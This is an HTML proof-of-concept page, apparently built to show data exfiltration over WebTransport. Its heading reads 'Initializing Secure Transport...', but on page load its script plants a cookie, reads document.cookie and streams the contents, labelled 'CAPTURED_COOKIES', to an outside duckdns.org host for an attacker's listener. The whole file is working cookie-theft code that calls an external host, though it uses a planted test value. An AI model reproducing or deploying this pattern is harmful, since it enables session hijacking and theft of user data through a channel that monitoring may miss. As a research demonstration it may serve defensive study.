<!DOCTYPE html>
<html>
<head>
    <title>WebTransport PoC</title>
</head>
<body>
    <h1>Initializing Secure Transport...</h1>
    <script>
        async function runExfil() {
    // 1. SET THE COOKIE (The "Victim" Data)
    // We set a test cookie that expires in 1 hour
    document.cookie = "user_session=SECRET_DATA_12345; path=/; max-age=3600; SameSite=Lax";
    console.log("Cookie planted.");

    const url = 'https://webrtc-poc.duckdns.org';
    
    try {
        const transport = new WebTransport(url);
        await transport.ready;
        console.log("WebTransport Connected!");

        // 2. READ THE COOKIE
        const cookies = document.cookie;
        
        // 3. EXFILTRATE THE DATA
        if (cookies) {
            const stream = await transport.createUnidirectionalStream();
            const writer = stream.getWriter();
            
            // We label it so it's easy to read in the Python terminal
            const payload = `CAPTURED_COOKIES: ${cookies}`;
            const data = new TextEncoder().encode(payload);
            
            await writer.write(data);
            await writer.close();
            console.log("Cookies exfiltrated successfully.");
        } else {
            console.log("No cookies found to exfiltrate.");
        }

    } catch (e) {
        console.error("Exfil failed:", e);
    }
}

// Execute the flow
runExfil();
    </script>
</body>
</html>
